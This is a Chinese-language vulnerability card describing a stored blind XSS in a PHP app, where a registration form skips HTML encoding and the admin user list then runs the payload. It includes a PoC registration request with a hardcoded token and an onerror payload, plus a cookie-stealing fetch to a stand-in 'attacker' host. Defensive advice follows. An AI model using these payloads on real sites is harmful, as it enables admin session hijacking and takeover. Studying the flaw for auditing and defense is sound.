---
id: web-generic-xss-admin-blind-stored-registration
title: 注册资料未编码导致后台用户列表存储型盲打 XSS
type: scenario
domain: web
path: web/generic/xss
technique: stored-blind-xss-admin-user-list
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- php
- xss
- stored-xss
- blind-xss
- admin-panel
- registration
cve: []
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:34:16+08:00'
  notes: 已对照原文与图 08-16 核对：注册接口 PDO 入库未做 HTML 编码、后台 user.php 用 echo 输出 bdmail/rep、硬编码 token 与前端验证码可绕过、POST account=aaa<img src=0 onerror=alert(1)> 后管理员用户列表弹窗，均与原文一致；卡片将验证码/token 仅作为投递前置，未夸大；窃取 Cookie 属延伸利用，原文仅验证 alert。
url: /docs/web/generic/xss/web-generic-xss-admin-blind-stored-registration/
draft: false
kb_aliases:
- 后台盲打 XSS
- 注册资料存储型 XSS
- 用户列表 XSS
- callreg XSS
- 管理员后台盲打
---

## 一句话结论

注册接口把用户提交的账号/邮箱直接写入数据库，后台用户列表页又用 `echo` 原样输出这些字段且未做 HTML 实体编码；攻击者注册一个带 `<img onerror>` 的账号，管理员打开用户列表时即触发存储型盲打 XSS，可进一步窃取管理员会话或以管理员身份操作后台。

## 原理

- 漏洞链路包含两个缺失的环节：**入库前未过滤/编码**、**出库渲染时未做 HTML 实体编码**。
- 注册接口 `/callreg.php` 用 PDO 预处理写入 `account`、`password`、`mail` 等字段，SQL 注入被阻断，但代码只检查非空，没有对内容做 HTML 转义或字符白名单。因此 `<img src=0 onerror=alert(1)>` 会原样进入数据库。
- 后台 `/admin/user.php` 查询全部用户后遍历 `$users`，在 HTML 表格的 `<td>` 中直接 `echo $user['bdmail']`、`echo $user['names']` 等字段，没有 `htmlspecialchars()`。浏览器把数据库中的字符串当 HTML 解析，事件处理器被执行。
- 盲打成立的条件是攻击者的输入在管理员可见的页面上回显；用户列表是管理员高频访问页面，因此注册一次即可在管理员浏览时触发。
- 该程序的注册接口还有一个可绕过点：服务端只校验 POST 与硬编码 token（`token` 常量直接写在源码中），并未校验前端展示的邮箱验证码；攻击者拿到源码中的固定 token 后可直接构造 POST，跳过前端邮箱验证流程。
- 后端 PHP 代码本身不执行该 payload，XSS 在管理员浏览器上下文执行，因此影响是管理员会话劫持/后台操作，而非服务器 RCE。

## 触发条件

- 注册接口允许提交任意字符的账号/邮箱（或至少允许 `<`、`>`、引号与事件属性）。
- 后台存在将用户资料原样输出到 HTML 的页面（本例为用户列表）。
- 管理员会访问该页面；或存在其他后台用户可见的回显点。
- 注册接口的 token/验证码校验可绕过（本例 token 硬编码、邮箱验证码仅前端校验）。

## 利用步骤

1. 阅读注册接口源码，确认字段入库前未编码，并找到硬编码 token 或可绕过的校验。
2. 直接构造 POST 请求注册账号，把 XSS payload 放入账号或邮箱字段。
3. 使用新账号正常登录/等待管理员查看用户列表。
4. 管理员打开 `/admin/user.php` 时 payload 执行；可改为加载外部 JS 窃取 Cookie、发起后台操作或植入持久化 XSS。
5. 若 Cookie 未设置 HttpOnly，可直接读取会话；否则以管理员浏览器发起 CSRF 式操作。

## PoC

注册请求（token 为源码中硬编码值）：

```http
POST /callreg.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

token=yhalpomxhys0183&account=aaa<img src=0 onerror=alert(1)>&password=1111&mail=aaaa
```

后台用户列表渲染（存在缺陷的代码形态）：

```php
<td class="..."><?php echo $user['bdmail']; ?></td>
<td class="..."><?php echo $user['rep']; ?></td>
```

管理员访问 `/admin/user.php` 后弹出 `alert(1)`，用户列表中账号列显示为 `aaa` 与一个加载失败的图片（原文截图可见）。

更进一步的载荷可改为：

```html
<img src=0 onerror="fetch('//attacker/collect?c='+document.cookie)">
```

## 变体与关联

- 同类回显点不限于用户列表：订单、评论、反馈、日志、导出页面等管理员可见处都可能形成盲打。
- 若后端使用了模板引擎但关闭自动转义，或前端用 `innerHTML` 拼接 AJAX 数据，也会形成同一类存储型 XSS。
- 该注册接口的固定 token 与前端邮箱验证码绕过是两个独立的弱点，可单独用于批量注册；本卡将其作为 XSS 投递的前置条件。
- 与反射型 XSS 的区别在于 payload 持久化在数据库，管理员每次访问都可能触发。

## 检测与防御

- 输出编码：所有用户可控数据进入 HTML 上下文时使用 `htmlspecialchars($v, ENT_QUOTES, 'UTF-8')`，或使用自动转义的模板引擎；属性、JS、URL 上下文分别采用对应编码。
- 输入校验：账号/邮箱按业务格式白名单校验；邮箱使用严格格式校验，拒绝 HTML 元字符。
- 注册接口服务端校验邮箱验证码，删除硬编码 token 或改为一次性、有时效、与会话绑定的 CSRF token。
- Cookie 设置 `HttpOnly`、`Secure`、`SameSite`，降低 XSS 窃取会话的影响；后台加 CSP 限制内联脚本与外部脚本加载。
- 代码审计关注所有 `echo`/`print` 输出用户数据的位置，以及 `innerHTML` 拼接；对后台管理页面做重点排查。
